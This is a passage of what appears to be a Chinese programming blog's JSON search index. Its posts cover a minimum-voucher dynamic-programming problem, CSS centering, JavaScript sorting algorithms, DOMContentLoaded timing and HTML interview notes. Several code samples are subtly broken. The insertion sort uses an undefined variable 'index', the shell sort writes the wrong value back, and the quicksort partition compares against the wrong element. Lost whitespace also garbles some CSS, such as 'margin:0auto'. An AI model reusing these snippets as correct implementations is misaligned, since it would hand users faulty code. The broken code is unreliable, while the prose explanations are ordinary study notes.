,"text":"代金券组合 假设现有100元的商品，而代金券有50元、30元、20元、5元四种，则最佳优惠是两张50元面额的代金券；而如果现有65元的商品，则最佳优惠是两张30元代金券以及一张5元代金券。给定目标金额和代金券种类，假设每类代金券数量无限多，求可以满足目标金额所需的最少代金券数量。如果没有任何组合可以满足，则输出Impossible 思路：这道题也是一个动态规划题。但是我那道题之后第一想法并没有想到动态规划，而是使用的递归查找，导致有大量的重复计算。效率不高，于是在线提交时直接tle了。递归查找的思路很简单，就是设置一个栈保存当前递归的路径，然后每一次递归都分别把所有代金券压入栈去试，如果压入栈后找到了符合的那么就保存当前栈内的路径。如果压入栈后不满足，那么就递归查找。 代码如下： 1234567891011121314151617181920//money目标金额//arr代金券数组//stack当前遍历路径//res结果数组，最终要在里面选最小的//currentlet min = Number.MAX_VALUEfunction getmax(money, arr, stack, res, current)&#123; let currentnum = current + (stack.length === 0 ? 0 : stack[stack.length - 1]) if(currentnum &lt; money)&#123; for(let i = arr.indexOf(stack[stack.length - 1]); i &lt; arr.length; i++)&#123; stack.push(arr[i]) getmax(money, arr, stack, res, currentnum) stack.pop() &#125; &#125; else if(currentnum === money)&#123; min = Math.min(min, stack.length) &#125; return min === Number.MAX_VALUE ? 'Impossible' : min&#125; 对于求极值问题，主要考虑动态规划来做，好处是保留了一些中间状态的计算值，可以避免大量的重复计算。我们维护一个一维动态数组 dp，其中 dp[i] 表示目标金额为i时的最小代金券数。那么我们就可以首先将dp所有元素初始化为最大值，然后对于dp[i]，分别使用所有代金券来更新他的最小值，更新的状态转移方程就是用 1dp[i] = min(dp[i], dp[i - coins[j]] + 1); 举个直观一点的例子来看就是，目标金额为100，当我只有5元代金券，dp[100]当然就是20当我又有20元代金券，那么我可以选择用或者不用，不用的话dp[100]依然是20，用了的话dp[100]就变成的dp[80] + 1,同理，当30元和50元的代金券到来时用同样的方法计算 代码如下： 123456789101112function getmax(money, arr)&#123; let dp = new Array(money + 1).fill(Number.MAX_VALUE - 10) dp[0] = 0 for(let i = 1; i &lt;= money; i++)&#123; for(let j of arr)&#123; if( i &gt;= j )&#123; dp[i] = Math.min(dp[i],dp[i-j]+1) &#125; &#125; &#125; return dp[money] === Number.MAX_VALUE - 10 ? 'Impossible' : dp[money]&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"常用居中方式","slug":"常用居中方式","date":"2020-03-18T16:00:00.000Z","updated":"2024-05-25T02:28:45.276Z","comments":true,"path":"2020/03/19/常用居中方式/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/19/%E5%B8%B8%E7%94%A8%E5%B1%85%E4%B8%AD%E6%96%B9%E5%BC%8F/","excerpt":"常用居中办法总结","text":"常用居中办法总结 水平居中：给 div 设置一个宽度，然后添加 margin:0auto 属性1234div &#123; width: 200px; margin: 0auto;&#125;水平居中，利用 text-align:center 实现 123456789101112.container &#123; background: rgba(0, 0, 0, 0.5); text-align: center; font-size: 0;&#125;.box &#123; display: inline-block; width: 500px; height: 400px; background-color: pink;&#125; 让绝对定位的 div 居中 1234567891011div &#123; position: absolute; width: 300px; height: 300px; margin: auto; top: 0; left: 0; bottom: 0; right: 0; background-color: pink; /*方便看效果*/&#125; 水平垂直居中一 123456789/*确定容器的宽高宽500高300的层设置层的外边距div&#123;*/position:absolute;/*绝对定位*/width:500px;height:300px;top:50%;left:50%;margin:-150px00-250px;/*外边距为自身宽高的一半*/background-color:pink;/*方便看效果*/&#125; 水平垂直居中二 12345678910/*未知容器的宽高，利用`transform`属性*/div &#123; position: absolute; /*相对定位或绝对定位均可*/ width: 500px; height: 300px; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: pink; /*方便看效果*/&#125; 水平垂直居中三 1234567891011/*利用flex布局实际使用时应考虑兼容性*/.container &#123; display: flex; align-items: center; /*垂直居中*/ justify-content: center; /*水平居中*/&#125;.containerdiv &#123; width: 100px; height: 100px; background-color: pink; /*方便看效果*/&#125; 水平垂直居中四 1234567891011121314151617181920212223242526272829/*利用text-align:center和vertical-align:middle属性*/.container &#123; position: fixed; top: 0; right: 0; bottom: 0; left: 0; background: rgba(0, 0, 0, 0.5); text-align: center; font-size: 0; white-space: nowrap; overflow: auto;&#125;.container::after &#123; content: \"\"; display: inline-block; height: 100%; vertical-align: middle;&#125;.box &#123; display: inline-block; width: 500px; height: 400px; background-color: pink; white-space: normal; vertical-align: middle;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"CSS","slug":"技术/前端/CSS","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/CSS/"}],"tags":[]},{"title":"前端必学排序算法","slug":"前端必学排序算法","date":"2020-03-17T16:00:00.000Z","updated":"2024-05-25T04:21:29.712Z","comments":true,"path":"2020/03/18/前端必学排序算法/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/18/%E5%89%8D%E7%AB%AF%E5%BF%85%E5%AD%A6%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","excerpt":"排序算法序言","text":"排序算法序言 排序算法的分类 比较类排序：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此也称为非线性时间比较类排序。 非比较类排序：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此也称为线性时间非比较类排序。 常用术语介绍 稳定 ：如果a原本在b前面，而a=b，排序之后a仍然在b的前面； 不稳定 ：如果a原本在b的前面，而a=b，排序之后a可能会出现在b的后面； 内排序 ：所有排序操作都在内存中完成； 外排序 ：由于数据太大，因此把数据放在磁盘中，而排序通过磁盘和内存的数据传输才能进行； 时间复杂度 ： 一个算法执行所耗费的时间。 空间复杂度 ：运行完一个程序所需内存的大小 常用算法的代价k：桶的个数 冒泡排序冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 算法描述 比较相邻的元素。如果第一个比第二个大，就交换它们两个； 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数； 针对所有的元素重复以上的步骤，除了最后一个； 重复步骤1~3，直到排序完成。 演示 代码实现12345678910111213function bubbleSort(arr) &#123; var len = arr.length; for(var i = 0; i &lt; len - 1; i++) &#123; for(var j = 0; j &lt; len - 1 - i; j++) &#123; if(arr[j] &gt; arr[j+1]) &#123; // 相邻元素两两对比 var temp = arr[j+1]; // 元素交换 arr[j+1] = arr[j]; arr[j] = temp; &#125; &#125; &#125; return arr;&#125; 选择排序选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 算法描述n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下： 初始状态：无序区为R[1..n]，有序区为空； 第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区； n-1趟结束，数组有序化了。 演示 代码实现123456789101112131415function selectSort(arr)&#123; let len = arr.length for(let i = 0; i &lt; len; i++)&#123; let min = i for(let j = i + 1; j &lt; len; j++)&#123; if(arr[j] &lt; arr[min])&#123; min = j &#125; &#125; let flag = arr[i] arr[i] = arr[min] arr[min] = flag &#125; return arr&#125; 插入排序插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。 算法描述一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下： 从第一个元素开始，该元素可以认为已经被排序； 取出下一个元素，在已经排序的元素序列中从后向前扫描； 如果该元素（已排序）大于新元素，将该元素移到下一位置； 重复步骤3，直到找到已排序的元素小于或者等于新元素的位置； 将新元素插入到该位置后； 重复步骤2~5。 演示 代码实现123456789101112131415function insertSort(arr)&#123; let len = arr.length for(let i = 0; i &lt; len - 1; i++)&#123; let j = i //保存取出来的元素 let flag = arr[j + 1] while(j &gt;= 0 &amp;&amp; index &lt; arr[j])&#123; arr[j + 1] = arr[j] j-- &#125; //放回取出来的元素 arr[j + 1] = flag &#125; return arr&#125; 希尔排序(shell)希尔排序介绍通过对插入排序的了解我们不难发现，简单插入排序对于那种小规模和本身顺序性就比较好的（基本有序）数列效果很好，因为每一趟需要进行比较的次数比较少。 但是实际现实中我们很难要求一个数列基本有序而且规模小，实际上，这么苛刻的条件在现实中几乎不会存在。一旦一个数组基本无序，甚至于在不知情的情况下直接是一个反序数组，那么插入排序的时间复杂度就真真正正的成了O(n^2)。 希尔大叔这个时候大喊：有条件就上，没有条件创造条件也给劳资上！！！ 于是从如何让排序的数列规模减小或者基本有序入手，希尔排序应运而生，突破O(n^2)的瓶劲。 希尔排序过程（图文）首先它把较大的数据集合分割成若干个小组（逻辑上分组），然后对每一个小组分别进行插入排序，此时，插入排序所作用的数据量比较小（每一个小组），插入的效率比较高可以看出，他是按下标相隔距离为4分的组，也就是说把下标相差4的分到一组，比如这个例子中a[0]与a[4]是一组、a[1]与a[5]是一组…，这里的差值（距离）被称为增量 然后对每个分组进行插入排序 此时，整个数组变的部分有序了（有序程度可能不是很高）然后缩小增量为上个增量的一半:2，继续划分分组，此时，每个分组元素个数多了，但是，数组变的部分有序了，插入排序效率同样高 同理对每个分组进行排序（插入排序），使其每个分组各自有序最后设置增量为上一个增量的一半：1，则整个数组被分为一组，此时，整个数组已经接近有序了，插入排序效率高这就是希尔排序的过程，同时创造小规模和基本有序两个条件，实现插入排序最快化 代码实现12345678910111213141516function shellSort(arr) &#123; var len = arr.length; for(var gap = Math.floor(len / 2); gap &gt; 0; gap = Math.floor(gap / 2)) &#123; // 注意：这里和动图演示的不一样，动图是分组执行，实际操作是多个分组交替执行 for(let i = 0; i &lt; len - gap; i ++)&#123; let j = i let flag = arr[j + gap] while(j &gt;= 0 &amp;&amp; arr[j] &gt; flag)&#123; arr[j + gap] = arr[j] j -= gap &#125; arr[j + gap] = arr[j] &#125; &#125; return arr;&#125; 归并排序归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。 算法描述 把长度为n的输入序列分成两个长度为n/2的子序列； 对这两个子序列分别递归采用归并排序； 将两个排序好的子序列合并成一个最终的排序序列。 演示 代码实现12345678910111213141516171819202122function mergeSort(arr)&#123; if(arr.length &lt;2) return arr let cen = Math.floor(arr.length / 2) //mergeSore一路递归拆树 //merge二路递归合树 return merge(mergeSort(arr.slice(0, cen)), mergeSort(arr.slice(cen)))&#125;function merge(left, right)&#123; var result = []; while(left.length &gt; 0 &amp;&amp; right.length &gt; 0) &#123; if(left[0] &lt;= right[0]) &#123; result.push(left.shift()); &#125; else&#123; result.push(right.shift()); &#125; &#125; while(left.length) result.push(left.shift()); while(right.length) result.push(right.shift()); return result;&#125; 快速排序（Quick Sort）快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。 算法描述快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下： 从数列中挑出一个元素，称为 “基准”（pivot）； 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作； 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。 演示 代码实现12345678910111213141516171819202122232425262728293031function quickSort(arr)&#123; //由于全程是在原数组上进行操作，所以使用start和end来截取控制当前正在处理的数组段 quicksort(arr, 0, arr.length - 1) return arr&#125;function quicksort(arr, start, end)&#123; //使用start和end截取当前需要处理的数组部分 //将截取的数组数组通过基准元素，分为左右两个部分，然后对左右两个部分进行递归，直到截取的数组长度小于2 if(start &lt; end)&#123; let mid = qs(arr, start, end) console.log(mid) quicksort(arr, start, mid - 1) quicksort(arr,mid + 1,end) &#125;&#125;function qs(arr, start, end)&#123; let mid = start + 1 for(let i = mid; i &lt;= end; i++)&#123; if(arr[i] &lt; arr[mid])&#123; swap(arr, i, mid) mid ++ &#125; &#125; swap(arr, mid - 1, start) return mid - 1&#125;function swap(arr, i, j) &#123; var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"DOMcontentLoaded和script","slug":"DOMcontentLoaded和script","date":"2020-03-15T16:00:00.000Z","updated":"2024-05-25T04:21:30.275Z","comments":true,"path":"2020/03/16/DOMcontentLoaded和script/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/16/DOMcontentLoaded%E5%92%8Cscript/","excerpt":"各种情况下DOMContentLoaded触发时机在事件类型一文中我们已经知道，HTML5有一个事件名为DOMcontentLoaded，它的触发时间为：当 HTML文档被加载和解析完成 所以接下来我们了解一下HTML文档的解析过程","text":"各种情况下DOMContentLoaded触发时机在事件类型一文中我们已经知道，HTML5有一个事件名为DOMcontentLoaded，它的触发时间为：当 HTML文档被加载和解析完成 所以接下来我们了解一下HTML文档的解析过程 在既没有CSS也没有JS的情况下，HTML文档的解析过程为： 有CSS无JS的情况下，HTML文档解析过程为： 渲染树的生成是基于DOM和CSSOM的。但是触发DOMContentLoaded的时间依然是在HTML解析为DOM后，无论此时CSS解析为CSSOM的过程是否完成。 有CSS也有JS我们回顾一下浏览器渲染原理里面，会阻塞渲染的一种情况： 然后当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。也就是说，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS文件，这也是都建议将 script 标签放在 body 标签底部的原因。 异步脚本、延迟脚本与DOMContentLoaded的关系sync同步HTML 文档被解析时如果遇见（同步）脚本，则停止解析，先去加载脚本，然后执行，执行结束后继续解析 HTML 文档。HTML文档解析完毕后触发DOMContentLoaded。 async异步带async的脚本一定会在load事件之前执行，可能会在DOMContentLoaded之前或之后执行。 情况1： HTML 还没有被解析完的时候，async脚本已经加载完了，那么 HTML 停止解析，去执行脚本，脚本执行完毕后触发DOMContentLoaded事件情况2： HTML 解析完了之后，async脚本才加载完，然后再执行脚本，那么在HTML解析完毕、async脚本还没加载完的时候就触发DOMContentLoaded事件。如下图所示总之， DomContentLoaded 事件只关注 HTML 是否被解析完，而不关注 async 脚本。 defer延迟如果 script 标签中包含 defer，那么这一块脚本将不会影响 HTML 文档的解析，而是等到 HTML 解析完成后才会执行。而 DOMContentLoaded 只有在 defer 脚本执行结束后才会被触发。 情况1：HTML还没解析完成时，defer脚本已经加载完毕，那么defer脚本将等待HTML解析完成后再执行。defer脚本执行完毕后触发DOMContentLoaded事件。如下图所示情况2：HTML解析完成时，defer脚本还没加载完毕，那么defer脚本继续加载，加载完成后直接执行，执行完毕后触发DOMContentLoaded事件。如下图所示：对于defer脚本，《JavaScript高级程序设计》一书的说法是:“按照h5规范，两个defer脚本会安装它们出现的先后顺序执行，两个脚本会在DOMContentLoaded之前执行。”","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"html复习汇总","slug":"html复习汇总","date":"2020-03-15T16:00:00.000Z","updated":"2024-05-25T04:21:30.275Z","comments":true,"path":"2020/03/16/html复习汇总/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/16/html%E5%A4%8D%E4%B9%A0%E6%B1%87%E6%80%BB/","excerpt":"HTML 面试知识点总结本文搬运自CavsZhouyou的github","text":"HTML 面试知识点总结本文搬运自CavsZhouyou的github 1. DOCTYPE 的作用是什么？ 相关知识点： IE5.5 引入了文档模式的概念，而这个概念是通过使用文档类型（DOCTYPE）切换实现的。 &lt;!DOCTYPE&gt;声明位于 HTML 文档中的第一行，处于 &lt;html&gt; 标签之前。告知浏览器的解析器用什么文档标准解析这个文档。 DOCTYPE 不存在或格式不正确会导致文档以兼容模式呈现。 回答（参考1-5）： &lt;!DOCTYPE&gt; 声明一般位于文档的第一行，它的作用主要是告诉浏览器以什么样的模式来解析文档。一般指定了之后会以标准模式来 进行文档解析，否则就以兼容模式进行解析。如果文档中包含过渡DTD和URI的DOCTYPE，也以严格模式呈现，但有过渡DTD而没有URI，会导致文档以混杂模式呈现。 在标准模式下，浏览器的解析规则都是按照最新的标准进行解析的。而在兼容模式下，浏览器会以向后兼容的方式来模拟老式浏览器的行为，以保证一些老的网站的正确访问。 在 html5 之后不再需要指定 DTD 文档，因为 html5 以前的 html 文档都是基于 SGML 的，所以需要通过指定 DTD 来定义文档中允许的属性以及一些规则。而 html5 不再基于 SGML 了，所以不再需要使用 DTD。 2. 标准模式与兼容模式各有什么区别？ 标准模式的渲染方式和 JS 引擎的解析方式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示，模拟老式浏览器的行为以防止站点无法工作。 举两个例子： 盒模型的高宽：在标准的w3c模式下，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度。而在IE5.5及以下的浏览器及其他版本的混杂模式下，这个宽度和高度还包含了padding和border 可以设置行内元素的高宽.在严格模式下，给span等行内元素设置width和height都没有效果，但是在混杂模式下会生效 3. HTML5 为什么只需要写 &lt;!DOCTYPE HTML&gt;，而不需要引入 DTD？ HTML5 不基于 SGML，因此不需要对 DTD 进行引用，但是需要 DOCTYPE 来规范浏览器的行为（让浏览器按照它们应该的方式来运行）。而 HTML4.01 基于 SGML ，所以需要对 DTD 进行引用，才能告知浏览器文档所使用的文档类型。 4. SGML 、 HTML 、XML 和 XHTML 的区别？ SGML 是标准通用标记语言，是一种定义电子文档结构和描述其内容的国际标准语言，是所有电子文档标记语言的起源。HTML 是超文本标记语言，主要是用于规定怎么显示网页。XML 是可扩展标记语言是未来网页语言的发展方向，XML 和 HTML 的最大区别就在于 XML 的标签是可以自己创建的，数量无限多， 而 HTML 的标签都是固定的而且数量有限。XHTML 也是现在基本上所有网页都在用的标记语言，他其实和 HTML 没什么本质的区别，标签都一样，用法也都一样，就是比 HTML更严格，比如标签必须都用小写，标签都必须有闭合标签等。 5. DTD 介绍 DTD（ Document Type Definition 文档类型定义）是一组机器可读的规则，它们定义 XML 或 HTML的特定版本中所有允许元素及它们的属性和层次关系的定义。在解析网页时，浏览器将使用这些规则检查页面的有效性并且采取相应的措施。DTD 是对 HTML 文档的声明，还会影响浏览器的渲染模式（工作模式）。 6. 行内元素定义 HTML4 中，元素被分成两大类: inline （内联元素）与 block（块级元素）。一个行内元素只占据它对应标签的边框所包含的空间常见的行内元素有 a b span img strong sub sup button input label select textarea 7. 块级元素定义 块级元素占据其父元素（容器）的整个宽度，因此创建了一个“块”。 常见的块级元素有 div ul ol li dl dt dd h1 h2 h3 h4 h5 h6 p 8. 行内元素与块级元素的区别？ HTML4中，元素被分成两大类：inline （内联元素）与 block （块级元素）。 （1） 格式上，默认情况下，行内元素不会以新行开始，而块级元素会新起一行。 （2） 内容上，默认情况下，行内元素只能包含文本和其他行内元素。而块级元素可以包含行内元素和其他块级元素。 （3）行内元素与块级元素属性的不同，主要是盒模型属性上：行内元素设置 width 无效，height 无效（可以设置 line-height），设置 margin 和 padding 的上下不会对其他元素产生影响。 9. HTML5 元素的分类 2 HTML4中，元素被分成两大类: inline（内联元素）与 block（块级元素）。但在实际的开发过程中，因为页面表现的需要，前端工程师经常把 inline 元素的 display 值设定为 block （比如 a 标签），也经常把 block 元素的 display值设定为inline，之后更是出现了 inline-block 这一对外呈现 inline 对内呈现 block的属性。因此，简单地把 HTML 元素划分为inline 与 block 已经不再符合实际需求。 HTML5中，元素主要分为7类：Metadata Flow Sectioning Heading Phrasing Embedded Interactive 10. 空元素定义 标签内没有内容的 HTML 标签被称为空元素。空元素是在开始标签中关闭的。 常见的空元素有：br hr img input link meta 11. link 标签定义 link 标签定义文档与外部资源的关系。 link 元素是空元素，它仅包含属性。 此元素只能存在于 head 部分，不过它可出现任何次数。 link 标签中的 rel 属性定义了当前文档与被链接文档之间的关系。常见的 stylesheet 指的是定义一个外部加载的样式表。 12. 页面导入样式时，使用 link 和 @import 有什么区别？ （1）从属关系区别。 @import 是 CSS 提供的语法规则，只有导入样式表的作用；link 是 HTML 提供的标签，不仅可以加载CSS 文件，还可以定义 RSS、rel 连接属性、引入网站图标等。 （2）加载顺序区别。加载页面时，link支持最大限度的并行下载；@import 引入的 CSS 将在页面加载完毕后被加载。 （3）兼容性区别。@import 是 CSS2.1 才有的语法，故只可在 IE5+ 才能识别；link 标签作为 HTML元素，不存在兼容性问题。 （4）DOM 可控性区别。可以通过 JS 操作 DOM ，插入 link 标签来改变样式；由于 DOM 方法是基于文档的，无法使用@import 的方式插入样式。 13. 你对浏览器的理解？ 浏览器的主要功能是将用户选择的 web 资源呈现出来，它需要从服务器请求资源，并将其显示在浏览器窗口中，资源的格式通常是 HTML，也包括PDF、image 及其他格式。用户用 URI（Uniform Resource Identifier统一资源标识符）来指定所请求资源的位置。 HTML 和 CSS 规范中规定了浏览器解释 html 文档的方式，由 W3C 组织对这些规范进行维护，W3C 是负责制定 web 标准的组织。 但是浏览器厂商纷纷开发自己的扩展，对规范的遵循并不完善，这为 web 开发者带来了严重的兼容性问题。 简单来说浏览器可以分为两部分，shell 和 内核。 其中 shell 的种类相对比较多，内核则比较少。shell是指浏览器的外壳：例如菜单，工具栏等。主要是提供给用户界面操作，参数设置等等。它是调用内核来实现各种功能的。 内核才是浏览器的核心。内核是基于标记语言显示内容的程序或模块。 也有一些浏览器并不区分外壳和内核。从 Mozilla 将 Gecko 独立出来后，才有了外壳和内核的明确划分。 14. 介绍一下你对浏览器内核的理解？ 主要分成两部分：渲染引擎和 JS 引擎。 渲染引擎的职责就是渲染，即在浏览器窗口中显示所请求的内容。默认情况下，渲染引擎可以显示 html、xml 文档及图片，它也 可以借助插件（一种浏览器扩展）显示其他类型数据，例如使用 PDF 阅读器插件，可以显示 PDF 格式。 JS 引擎：解析和执行 javascript 来实现网页的动态效果。 最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。 15. 常见的浏览器内核比较 Trident：这种浏览器内核是 IE 浏览器用的内核，因为在早期 IE 占有大量的市场份额，所以这种内核比较流行，以前有很多网页也是根据这个内核的标准来编写的，但是实际上这个内核对真正的网页标准支持不是很好。但是由于 IE 的高市场占有率，微软也很长时间没有更新Trident 内核，就导致了 Trident 内核和 W3C 标准脱节。还有就是 Trident 内核的大量 Bug 等安全问题没有得到解决，加上一些专家学者公开自己认为 IE 浏览器不安全的观点，使很多用户开始转向其他浏览器 Gecko：这是 Firefox 和 Flock所采用的内核，这个内核的优点就是功能强大、丰富，可以支持很多复杂网页效果和浏览器扩展接口，但是代价是也显而易见就是要消耗很多的资源，比如内存。 Presto：Opera 曾经采用的就是 Presto 内核，Presto内核被称为公认的浏览网页速度最快的内核，这得益于它在开发时的天生优势，在处理 JS脚本等脚本语言时，会比其他的内核快3倍左右，缺点就是为了达到很快的速度而丢掉了一部分网页兼容性。 Webkit：Webkit 是 Safari 采用的内核，它的优点就是网页浏览速度较快，虽然不及 Presto 但是也胜于 Gecko 和Trident，缺点是对于网页代码的容错性不高，也就是说对网页代码的兼容性较低，会使一些编写不标准的网页无法正确显示。WebKit 前身是KDE 小组的 KHTML 引擎，可以说 WebKit 是 KHTML 的一个开源的分支。 Blink：谷歌在 Chromium Blog 上发表博客，称将与苹果的开源浏览器核心 Webkit 分道扬镳，在Chromium项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。其实 Blink 引擎就是 Webkit的一个分支，就像 webkit 是KHTML 的分支一样。Blink 引擎现在是谷歌公司与 Opera Software共同研发，上面提到过的，Opera 弃用了自己的 Presto 内核，加入 Google 阵营，跟随谷歌一起研发 Blink。 详细的资料可以参考： 《浏览器内核的解析和对比》 《五大主流浏览器内核的源起以及国内各大浏览器内核总结》 16. 常见浏览器所用内核 （1） IE 浏览器内核：Trident 内核，也是俗称的 IE 内核； （2） Chrome 浏览器内核：统称为 Chromium 内核或 Chrome 内核，以前是 Webkit 内核，现在是 Blink内核； （3） Firefox 浏览器内核：Gecko 内核，俗称 Firefox 内核； （4） Safari 浏览器内核：Webkit 内核； （5） Opera 浏览器内核：最初是自己的 Presto 内核，后来加入谷歌大军，从 Webkit 又到了 Blink 内核； （6） 360浏览器、猎豹浏览器内核：IE + Chrome 双内核； （7） 搜狗、遨游、QQ 浏览器内核：Trident（兼容模式）+ Webkit（高速模式）； （8） 百度浏览器、世界之窗内核：IE 内核； （9） 2345浏览器内核：好像以前是 IE 内核，现在也是 IE + Chrome 双内核了； （10）UC 浏览器内核：这个众口不一，UC 说是他们自己研发的 U3 内核，但好像还是基于 Webkit 和 Trident，还有说是基于火狐内核。 17. 浏览器的渲染原理？ （1）首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。 （2）然后对 CSS 进行解析，生成 CSSOM 规则树。 （3）根据 DOM 树和 CSSOM规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。 （4）当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。 （5）布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。 （6）复合图层的合成、GPU绘制 值得注意的是，这个过程是逐步完成的，为了更好的用户体验，渲染引擎将会尽可能早的将内容呈现到屏幕上，并不会等到所有的html都解析完成之后再去构建和布局 render 树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。 详细资料可以参考： 《浏览器渲染原理》 《浏览器的渲染原理简介》 《前端必读：浏览器内部工作原理》 《深入浅出浏览器渲染原理》 18. 渲染过程中遇到 JS 文件怎么处理？（浏览器解析过程） JavaScript 的加载、解析与执行会阻塞文档的解析，也就是说，在构建 DOM 时，HTML 解析器若遇到了 JavaScript，那么它会暂停文档的解析，将控制权移交给 JavaScript 引擎，等 JavaScript 引擎运行完毕，浏览器再从中断的地方恢复继续解析文档。 也就是说，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。当然在当下，并不是说 script 标签必须放在底部，因为你可以给 script 标签添加 defer 或者 async 属性。 19. async 和 defer 的作用是什么？有什么区别？（浏览器解析过程） （1）脚本没有 defer 或 async，浏览器会立即加载并执行指定的脚本，也就是说不等待后续载入的文档元素，读到就加载并执行。 （2）defer 属性表示延迟执行引入的 JavaScript，即这段 JavaScript 加载时 HTML 并未停止解析，这两个过程是并行的。当整个 document 解析完毕后再执行脚本文件，在 DOMContentLoaded 事件触发之前完成。多个脚本按顺序执行。 （3）async 属性表示异步执行引入的 JavaScript，与 defer的区别在于，如果已经加载好，就会开始执行，也就是说它的执行仍然会阻塞文档的解析，只是它的加载过程不会阻塞。多个脚本的执行顺序无法保证。 